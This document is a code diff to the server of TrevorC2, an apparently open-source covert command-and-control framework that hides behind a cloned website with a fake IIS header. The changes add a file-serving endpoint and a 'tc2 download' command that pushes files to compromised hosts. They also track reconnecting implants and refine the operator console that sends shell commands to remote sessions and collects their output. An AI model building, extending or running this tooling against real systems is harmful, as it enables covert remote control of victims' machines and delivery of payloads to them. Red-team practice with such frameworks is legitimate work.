@@ -22,6 +22,9 @@ ROOT_PATH_QUERY = ("/")
 # THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
 SITE_PATH_QUERY = ("/images")
 
+# THIS IS THE PATH WHERE THE FILES WILL BE DOWNLOADED FROM
+FILE_PATH_QUERY = ("/files")
+
 # THIS IS THE QUERY STRING PARAMETER USED
 QUERY_STRING = ("guid=")
 
@@ -89,6 +92,8 @@ log = logging.getLogger(__name__)
 __author__ = 'Dave Kennedy (@HackingDave)'
 __version__ = 0.7
 
+__dir__ = os.path.dirname(os.path.abspath(__file__))
+
 # ROOT CHECK
 if os.geteuid() != 0:
     print("\n[!] TrevorC2 needs to be run as root (web socket binding, etc.)... Re-run TrevorC2 as sudo/root in order to run.")
@@ -102,8 +107,18 @@ except NameError: pass
 assets = []
 def register_assets(sessionid,hostname,remoteip):
     global assets
-    asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
-    assets.append(asset)
+    isregistered = False
+    if assets != []:
+        for a in assets:
+            if a['sessionid'] == sessionid:
+                isregistered = True
+
+    if isregistered == False:
+        asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
+        assets.append(asset)
+        return True
+    else:
+        return False
 
 def randomString():
     """Generate a random string of fixed length """
@@ -164,25 +179,26 @@ def urldecode(url):
     rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
     return rex.sub(htc, url)
 
-
 def clone_site(user_agent, url):
     """Our clone site function, to get the site we want to serve.
-
     :params user_agent = User Agent to grab the site with.
     :params url = URL if the site you want to clone.
     """
+
+    base_dir = os.path.join(__dir__, "clone_site/")
     # auto remove old site
-    if os.path.isdir("clone_site/"):
-        for filename in glob.glob(os.path.abspath("clone_site/*")):
+    if os.path.isdir(base_dir):
+        for filename in glob.glob(os.path.abspath(base_dir + "*")):
             if os.path.isdir(filename):
                 shutil.rmtree(filename)
             else:
                 os.remove(filename)
     else:
-        os.makedirs("clone_site/")
+        os.makedirs(base_dir)
 
     # run our wget
     print("[*] Cloning website: " + url)
+    index_html = os.path.join(base_dir, "index.html")
     try:
         web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
         if web_request.status_code != 200 or len(web_request.content) < 1:
@@ -190,17 +206,16 @@ def clone_site(user_agent, url):
             print("[!] Exiting TrevorC2...")
             sys.exit()
 
-        with open("clone_site/index.html", 'wb') as fh:
+        with open(index_html, 'wb') as fh:
             fh.write(web_request.content)
 
     except requests.ConnectionError:
         print("[-] Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
-        with open("clone_site/index.html", "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")
+        with open(index_html, "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")
 
     # report success
-    if os.path.isfile("clone_site/index.html"):
+    if os.path.isfile(index_html):
         print("[*] Site cloned successfully.")
-
 
 class UnknownPageHandler(tornado.web.RequestHandler):
     """No Endpoint Handler."""
@@ -211,7 +226,7 @@ class UnknownPageHandler(tornado.web.RequestHandler):
         remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
         log.warning('Request to Invalid Page from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
-        site_data = open("clone_site/index.html", "r").read()
+        site_data = open(os.path.join(__dir__, "clone_site/index.html"), "r").read()
         self.write(site_data)
         #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
         return
@@ -226,7 +241,7 @@ class RPQ(tornado.web.RequestHandler):
         remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
         log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
-        site_data = open("clone_site/index.html", "r").read()
+        site_data = open(os.path.join(__dir__, "clone_site/index.html"), "r").read()
         if self.get_cookie(COOKIE_SESSIONID_STRING):
             sid = self.get_cookie(COOKIE_SESSIONID_STRING)
             instructions = instructionsdict[sid]
@@ -269,13 +284,16 @@ class SPQ(tornado.web.RequestHandler):
         # register hostnames
         if "magic_hostname=" in query_output:
             hostname = query_output.split("=")[1]
-            register_assets(sid,hostname,remote_ip)
+            isregistered = register_assets(sid,hostname,remote_ip)
             set_instruction(sid,"nothing")
-            print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
+            if isregistered == True:
+                print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
+            else:
+                print("\n*** Reconnected {} with hostname {} and communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
         else:
             hostname = query_output.split("::::")[0]
             data = query_output.split("::::")[1]
-            with open("clone_site/received_" + sid + ".txt", "w") as fh:
+            with open(os.path.join(__dir__, "clone_site/received_") + sid + ".txt", "w") as fh:
                 fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
             set_instruction(sid,"nothing")
 
@@ -284,6 +302,7 @@ def main_c2():
     application = tornado.web.Application([
         (ROOT_PATH_QUERY, RPQ),
         (SITE_PATH_QUERY, SPQ),
+        (r'' + FILE_PATH_QUERY + '/(.*)', tornado.web.StaticFileHandler, {'path':os.path.join(__dir__, 'files')}),
         (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
     ])
 
@@ -370,8 +389,9 @@ if __name__ == "__main__":
                 print("*** TrevorC2 Help Menu ***\n\n")
                 print("Command Usage:\n")
                 print("list - will list all shells available")
-                print("interact <id> - allow you to select which shells to interact with\n")
-                print("ifconfig - allows you to see your interface data for server")
+                print("interact <id> - allow you to select which shells to interact with")
+                print("downloads - list all files in downloads\n")
+                print("ifconfig - allows you to see your interface data for server\n")
 
             # list available shells
             if task == "list":
@@ -380,7 +400,7 @@ if __name__ == "__main__":
                 if assets == []:
                     print("No available TrevorC2 shells.")
                 else:
-                    print("Format: <session_id> <hostname>:<ipaddress>:<communication_sessionid>\n")
+                    print("Format: <session_id>. <hostname> <ipaddress> <communication_sessionid>\n")
                     for a in assets:
                         counter = counter + 1
                         print(str(counter) + ". " + a['hostname'] + " " + a['remoteip'] + " " + a['sessionid']  + " (Trevor C2 Established)")
@@ -392,6 +412,15 @@ if __name__ == "__main__":
                 stdout = subprocess.Popen("ifconfig", shell=True)
                 proc = stdout.communicate()[0]
                 print(proc)
+
+            if task == "downloads":
+                print("\n*** Available TrevorC2 downloads Below ***\n")
+                print("Interact with a session first and use the following format: tc2 download <filename>\n")
+                files_dir = os.path.join(__dir__, "files/")
+                if os.path.isdir(files_dir):
+                    for filename in glob.glob(os.path.abspath((files_dir + "*"))):
+                        print(os.path.basename(filename))
+                print("\n")
 
             if task == "quit" or task == "exit":
                 print("[*] Exiting TrevorC2... ")
@@ -414,20 +443,44 @@ if __name__ == "__main__":
                             print("[*] Use exit or back to select other shells")
                             while 1:
                                 task = input(hostname + ":trevorc2>")
-                                if task == "quit" or task == "exit" or task == "back": break
-                                task = (hostname + "::::" + task)
-                                set_instruction(sid,task)
-                                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
-                                while 1:
-                                    # we received a hit with our command
-                                    if os.path.isfile("clone_site/received_" + sid + ".txt"):
-                                        data = open("clone_site/received_" + sid + ".txt", "r").read()
-                                        print("[*] Received response back from client...")
-                                        print(data)
-                                        # remove this so we don't use it anymore
-                                        os.remove("clone_site/received_" + sid + ".txt")
-                                        break
-                                    time.sleep(.3)
+                                execute_task = True
+                                if task == "quit" or task == "exit" or task == "back":
+                                    break
+                                elif task == "help" or task == "?":
+                                    print("*** TrevorC2 Interact Help Menu ***\n\n")
+                                    print("Command Usage:\n")
+                                    print("tc2 download <filename> - download a file to this session")
+                                    print("tc2 quit - stop the tc2 client\n")
+                                    execute_task = False
+                                elif task.lower().startswith('tc2 download'): #prepend the filepath
+                                    temp_task = task.split(' ', 2)
+                                    filetodownload = temp_task[2]
+                                    temp_task[2] = FILE_PATH_QUERY + '/' + temp_task[2]
+                                    task = ' '.join(temp_task)
+                                    files_dir = os.path.join(__dir__, "files/")
+                                    execute_task = False
+                                    if os.path.isdir(files_dir):
+                                        for filename in glob.glob(os.path.abspath((files_dir + "*"))):
+                                            if os.path.basename(filename.lower()) == filetodownload.lower():
+                                                execute_task = True
+                                    if execute_task == False:
+                                        print("The file '" + filetodownload + "' does not exist, go back and user the command 'downloads' to view all available files")
+
+                                if execute_task:
+                                    task = (hostname + "::::" + task)
+                                    set_instruction(sid,task)
+                                    print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                                    while 1:
+                                        # we received a hit with our command
+                                        received_file = os.path.join(__dir__, "clone_site/received_") + sid + '.txt'
+                                        if os.path.isfile(received_file):
+                                            data = open(received_file, "r").read()
+                                            print("[*] Received response back from client...")
+                                            print(data)
+                                            # remove this so we don't use it anymore
+                                            os.remove(received_file)
+                                            break
+                                        time.sleep(.3)
                         else :
                              print("[!] Session id {} does not exist.".format(hostname_sessionid))
                     else :
@@ -437,6 +490,7 @@ if __name__ == "__main__":
 
     # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
-        if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
+        clone_site = os.path.join(__dir__, "clone_site/")
+        if os.path.isdir(clone_site): shutil.rmtree(clone_site)
         print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
         os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
